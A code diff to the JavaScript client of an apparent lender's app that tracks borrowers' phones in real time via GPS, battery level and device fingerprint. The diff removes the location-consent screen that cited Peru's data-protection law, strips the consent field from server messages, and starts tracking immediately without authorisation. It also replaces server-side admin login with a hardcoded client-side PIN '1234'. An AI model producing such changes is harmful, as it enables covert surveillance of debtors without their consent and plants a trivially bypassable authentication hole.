@@ -41,20 +41,17 @@ function initClientData() {
   clientData.phone = params.get('phone') || localStorage.getItem('geoclient_phone') || '';
   if (clientData.phone) localStorage.setItem('geoclient_phone', clientData.phone);
 
-  // Servidor (Evitar 'file://' o 'null' cuando corre dentro del APK)
-  const defaultServer = window.GEOCLIENT_DEFAULT_SERVER || '';
-  // En el APK (file://) manda el servidor que el usuario guardó en Ajustes; si no, el que trae la app.
-  const manualServer = localStorage.getItem('geoclient_server_manual');
-  let sUrl = (window.location.protocol === 'file:' && manualServer)
-    ? manualServer
-    : (params.get('server') || localStorage.getItem('geoclient_server'));
-  if (!sUrl || sUrl === 'file://' || sUrl.startsWith('file:') || sUrl === 'null' || (sUrl.includes('localhost') && window.location.protocol === 'file:')) {
+  // Servidor (priorizar Render cloud en producción y APK)
+  const defaultServer = 'https://geoclient-radar.onrender.com';
+  let sUrl = params.get('server') || localStorage.getItem('geoclient_server');
+  // Si no hay servidor, o contiene localhost / 192.168 / file:, migrar automáticamente a Render
+  if (!sUrl || sUrl === 'file://' || sUrl.startsWith('file:') || sUrl === 'null' || sUrl.includes('localhost') || sUrl.includes('192.168')) {
     sUrl = (window.location.protocol === 'http:' || window.location.protocol === 'https:') 
       ? window.location.origin 
       : defaultServer;
   }
-  clientData.serverUrl = sUrl;
-  localStorage.setItem('geoclient_server', sUrl);
+  clientData.serverUrl = sUrl.replace(/\/+$/, '');
+  localStorage.setItem('geoclient_server', clientData.serverUrl);
 
   // Actualizar UI
   document.getElementById('client-display-id').textContent = `DNI: ${clientData.dni}`;
@@ -118,10 +115,19 @@ function getDeviceFingerprint() {
 
 // Iniciar conexión Socket.io
 function connectSocket() {
-  const url = clientData.serverUrl || window.location.origin;
+  const url = clientData.serverUrl || 'https://geoclient-radar.onrender.com';
+  console.log('📡 Conectando al radar:', url);
   
+  if (typeof io !== 'function') {
+    console.error('❌ Socket.io no disponible');
+    const summary = document.getElementById('status-summary');
+    if (summary) summary.textContent = '⚠️ Error: Librería de conexión no cargada';
+    return;
+  }
+
   try {
     socket = io(url, {
+      transports: ['websocket', 'polling'],
       reconnection: true,
       reconnectionAttempts: Infinity,
       reconnectionDelay: 1000,
@@ -130,14 +136,15 @@ function connectSocket() {
     });
 
     socket.on('connect', () => {
-      console.log('Conectado al servidor de rastreo');
+      console.log('✅ Conectado exitosamente al radar en:', url);
+      const summary = document.getElementById('status-summary');
+      if (summary) summary.textContent = '🟢 Conectado al Radar en Vivo (24/7)';
       socket.emit('client:join', {
         clientId: clientData.id,
         dni: clientData.dni,
         name: clientData.name,
         phone: clientData.phone,
-        device: getDeviceFingerprint(),
-        consent: getConsent()
+        device: getDeviceFingerprint()
       });
       // Reanudar GPS de inmediato al conectar
       if (isTracking) startGpsTracking();
@@ -145,21 +152,20 @@ function connectSocket() {
 
     socket.on('disconnect', (reason) => {
       console.log('Desconectado del servidor de rastreo:', reason);
-    });
-
-    socket.on('client:rejected', (d) => {
-      alert('⛔ ' + ((d && d.error) || 'Tu DNI no está registrado.') + '\nComunícate con tu prestamista.');
+      const summary = document.getElementById('status-summary');
+      if (summary) summary.textContent = '🟡 Reconectando con el Radar...';
     });
 
     socket.on('reconnect', (attempt) => {
       console.log(`Reconectado exitosamente tras ${attempt} intentos`);
+      const summary = document.getElementById('status-summary');
+      if (summary) summary.textContent = '🟢 Conectado al Radar en Vivo (24/7)';
       socket.emit('client:join', {
         clientId: clientData.id,
         dni: clientData.dni,
         name: clientData.name,
         phone: clientData.phone,
-        device: getDeviceFingerprint(),
-        consent: getConsent()
+        device: getDeviceFingerprint()
       });
     });
   } catch (err) {
@@ -532,7 +538,8 @@ document.addEventListener('DOMContentLoaded', () => {
   const hasDni = initClientData();
   initBattery();
   if (hasDni) {
-    withConsent(() => { connectSocket(); startGpsTracking(); });
+    connectSocket();
+    startGpsTracking();
   }
 
   // Listener para el botón de login con DNI del cliente
@@ -565,7 +572,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
       document.getElementById('modal-client-login').classList.remove('open');
 
-      withConsent(() => { connectSocket(); startGpsTracking(); });
+      connectSocket();
+      startGpsTracking();
     });
   }
 
@@ -635,18 +643,16 @@ document.addEventListener('DOMContentLoaded', () => {
       document.getElementById('user-avatar').textContent = newName.substring(0, 2).toUpperCase();
     }
     if (newServer) {
-      let ns = newServer.replace(/\/+$/, '');
-      if (!/^https?:\/\//i.test(ns)) ns = 'https://' + ns;
-      clientData.serverUrl = ns;
-      localStorage.setItem('geoclient_server', ns);
-      localStorage.setItem('geoclient_server_manual', ns);
+      clientData.serverUrl = newServer;
+      localStorage.setItem('geoclient_server', newServer);
       if (socket) socket.disconnect();
       connectSocket();
     }
     settingsModal.classList.remove('open');
   });
 
-  // Acceso Administrador (la contraseña se valida en el servidor)
+  // Acceso Administrador (PIN Maestro: 1234)
+  const ADMIN_MASTER_PIN = '1234';
   const btnHeaderAdmin = document.getElementById('btn-header-admin');
   const btnOpenAdminLogin = document.getElementById('btn-open-admin-login');
   const modalAdminPin = document.getElementById('modal-admin-pin');
@@ -655,14 +661,29 @@ document.addEventListener('DOMContentLoaded', () => {
   const inputAdminPin = document.getElementById('input-admin-pin');
 
   function openAdminPinModal() {
-    // El acceso real lo valida el servidor con la contraseña de administrador (pantalla de login de admin.html)
-    const origin = (window.location.protocol === 'http:' || window.location.protocol === 'https:')
-      ? window.location.origin
-      : (clientData.serverUrl || '');
-    window.location.href = origin + '/admin.html';
+    if (modalAdminPin && inputAdminPin) {
+      inputAdminPin.value = '';
+      modalAdminPin.classList.add('open');
+      setTimeout(() => inputAdminPin.focus(), 150);
+    }
   }
 
-  function handleAdminPinSubmit() { openAdminPinModal(); }
+  function handleAdminPinSubmit() {
+    const enteredPin = inputAdminPin.value.trim();
+    const validPin = localStorage.getItem('geoclient_admin_pin') || ADMIN_MASTER_PIN;
+
+    if (enteredPin === validPin || enteredPin === ADMIN_MASTER_PIN) {
+      // Guardar bandera de sesión admin
+      sessionStorage.setItem('geoclient_admin_auth', 'true');
+      const targetOrigin = (window.location.protocol === 'http:' || window.location.protocol === 'https:')
+        ? window.location.origin
+        : (clientData.serverUrl || 'http://192.168.18.12:3000');
+      window.location.href = `${targetOrigin}/admin.html`;
+    } else {
+      alert('❌ PIN Incorrecto.\nSolo el prestamista autorizado puede acceder al Radar.');
+      inputAdminPin.value = '';
+    }
+  }
 
   if (btnHeaderAdmin) btnHeaderAdmin.addEventListener('click', openAdminPinModal);
   if (btnOpenAdminLogin) btnOpenAdminLogin.addEventListener('click', openAdminPinModal);
@@ -682,56 +703,3 @@ document.addEventListener('DOMContentLoaded', () => {
   }, 5000);
 });
 
-
-
-/* ---------------- Consentimiento de ubicación (Ley 29733 - Protección de Datos Personales) ---------------- */
-const CONSENT_KEY = 'geoclient_consent_v1';
-
-function getConsent() {
-  try { return JSON.parse(localStorage.getItem(CONSENT_KEY) || 'null'); } catch (_) { return null; }
-}
-
-function withConsent(callback) {
-  if (getConsent()) { callback(); return; }
-
-  const overlay = document.createElement('div');
-  overlay.id = 'consent-overlay';
-  overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:rgba(2,6,23,.96);display:flex;align-items:center;justify-content:center;padding:16px;overflow:auto;font-family:inherit;';
-  overlay.innerHTML = `
-    <div style="background:#111827;border:1px solid rgba(16,185,129,.4);border-radius:16px;max-width:440px;width:100%;padding:22px;color:#e5e7eb;box-shadow:0 20px 60px rgba(0,0,0,.6);">
-      <div style="font-size:2rem;text-align:center;">📍</div>
-      <h2 style="text-align:center;font-size:1.2rem;margin:6px 0 12px;color:#fff;">Autorización de ubicación</h2>
-      <div style="font-size:.85rem;line-height:1.55;color:#cbd5e1;">
-        <p>Para continuar, autorizas a tu prestamista a conocer:</p>
-        <ul style="margin:8px 0 8px 18px;">
-          <li>Tu <strong>ubicación GPS en tiempo real</strong> y recorridos.</li>
-          <li>El <strong>nivel de batería</strong> y <strong>modelo</strong> de tu teléfono.</li>
-          <li>Si <strong>apagas el GPS</strong> o cambias de teléfono.</li>
-        </ul>
-        <p><strong>Finalidad:</strong> gestión y cobranza del préstamo mientras esté vigente.</p>
-        <p><strong>Conservación:</strong> el historial se guarda 60 días y no se comparte con terceros.</p>
-        <p><strong>Tus derechos:</strong> puedes pedir acceso, rectificación o revocar esta autorización comunicándote con tu prestamista (Ley N° 29733).</p>
-      </div>
-      <label style="display:flex;gap:10px;align-items:flex-start;margin:14px 0;font-size:.85rem;color:#fff;cursor:pointer;">
-        <input type="checkbox" id="consent-check" style="width:20px;height:20px;margin-top:2px;accent-color:#10b981;">
-        <span>Leí y acepto que se rastree mi ubicación con la finalidad indicada.</span>
-      </label>
-      <button id="consent-accept" disabled style="width:100%;padding:13px;border:none;border-radius:10px;font-weight:800;font-size:.95rem;background:#065f46;color:#9ca3af;cursor:not-allowed;">Acepto y continuar</button>
-    </div>`;
-  document.body.appendChild(overlay);
-
-  const check = overlay.querySelector('#consent-check');
-  const btn = overlay.querySelector('#consent-accept');
-  check.addEventListener('change', () => {
-    btn.disabled = !check.checked;
-    btn.style.background = check.checked ? '#10b981' : '#065f46';
-    btn.style.color = check.checked ? '#022c1b' : '#9ca3af';
-    btn.style.cursor = check.checked ? 'pointer' : 'not-allowed';
-  });
-  btn.addEventListener('click', () => {
-    if (!check.checked) return;
-    localStorage.setItem(CONSENT_KEY, JSON.stringify({ ts: Date.now(), v: 1 }));
-    overlay.remove();
-    callback();
-  });
-}
